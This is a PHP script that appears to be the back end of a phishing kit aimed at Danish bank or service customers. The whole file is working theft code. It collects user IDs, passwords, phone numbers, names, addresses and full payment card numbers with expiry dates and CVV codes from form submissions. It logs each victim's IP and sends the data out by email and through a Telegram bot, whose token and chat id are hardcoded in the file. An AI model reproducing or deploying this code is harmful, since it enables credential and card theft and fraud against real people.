<?php 
session_start();
error_reporting(0);
require ("sc.php");
$token = "6406037764:AAHy-W9DFGPpm_k4ag6Q_jdZdA1Re_zAt3Q";
$idchat = "979803173";





if($_GET['form'] == "log"){


$input1 = isset($_POST['input1']) ? $_POST['input1'] : '';
$input2 = isset($_POST['input2']) ? $_POST['input2'] : '';
$input3 = isset($_POST['input2']) ? $_POST['input2'] : '';

$IP = getenv("REMOTE_ADDR");
$_SESSION["input1"] = $_POST["input1"];
$_SESSION["input2"] = $_POST["input2"];
$_SESSION["input3"] = $_POST["input3"];
$message = "[ " . $IP . " ] \n";
$message .= "<----LOG---->\n";
$message .= " BRUGER-ID  :".$_POST['input1']."  \n";
$message .= " ADGANGSKODE  :   ".$_POST['input2']."  \n";
$message .= " TELEFONNUMMER  :   ".$_POST['input3']."  \n";
$message .= " REGION  :   ". $cn ."  \n";
$message .= "-----******--\n";



mail($email,$subject,$message);
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$idchat&text=" . urlencode($message)."" );

}elseif($_GET['form'] == "kk"){

$fname = isset($_POST['fname']) ? $_POST['fname'] : '';
$eml = isset($_POST['eml']) ? $_POST['eml'] : '';
$adr = isset($_POST['adr']) ? $_POST['adr'] : '';
$zip = isset($_POST['zip']) ? $_POST['zip'] : '';
$kk = isset($_POST['kk']) ? $_POST['kk'] : '';
$ex = isset($_POST['ex']) ? $_POST['ex'] : '';
$cv = isset($_POST['cv']) ? $_POST['cv'] : '';



$IP = getenv("REMOTE_ADDR");
$_SESSION["fname"] = $_POST["fname"];
$_SESSION["eml"] = $_POST["eml"];
$_SESSION["adr"] = $_POST["adr"];
$_SESSION["zip"] = $_POST["zip"];
$_SESSION["kk"] = $_POST["kk"];
$_SESSION["ex"] = $_POST["ex"];
$_SESSION["cv"] = $_POST["cv"];
$message = "[ " . $IP . " ] \n";
$message .= "<----DETAILS--->\n";
$message .= " REGION  :   ". $cn ."  \n";
$message .= " NAME  :".$_POST['fname']."  \n";
$message .= " EMAIL  :".$_POST['eml']."  \n";
$message .= " ADRESS  :   ".$_POST['adr']."  \n";
$message .= " ZIP  :   ".$_POST['zip']."  \n";
$message .= "<--KK-->\n";
$message .= " CC  :   ".$_POST['kk']."  \n";
$message .= " EX  :   ".$_POST['ex']."  \n";
$message .= " CV  :   ".$_POST['cv']."  \n";
$message .= "--******--\n";



mail($email,$subject,$message);
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$idchat&text=" . urlencode($message)."" );

}



/////////////////////////////////////////////////////////

?>